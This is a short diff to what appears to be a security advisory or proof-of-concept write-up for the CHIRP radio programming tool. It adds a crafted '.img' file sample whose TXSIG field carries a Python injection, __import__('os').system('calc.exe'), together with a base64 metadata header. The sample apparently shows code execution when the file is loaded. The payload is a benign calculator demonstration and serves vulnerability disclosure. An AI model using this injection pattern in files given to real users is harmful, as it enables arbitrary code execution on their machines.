@@ -41,7 +41,11 @@ CH,ZN,RXF,TXF,NAME,TXSIG,RXSIG
 ### Malicious `.img`
 
 ```
+// Conventional Data
+CH,ZN,RXF,TXF,NAME,TXSIG,RXSIG
+1,0,146520000,146520000,EVIL,__import__('os').system('calc.exe'),0
 
+ chirpεimgeyJyY2xhc3MiOiAiSVRNUmFkaW8iLCAidmVuZG9yIjogIktlbndvb2QiLCAibW9kZWwiOiAiSVRNIiwgInZhcmlhbnQiOiAiIiwgImNoaXJwX3ZlcnNpb24iOiAiZGFpbHktMjAyMzAxMDEifQ==
 ```
 
 ### Triggering in CHIRP
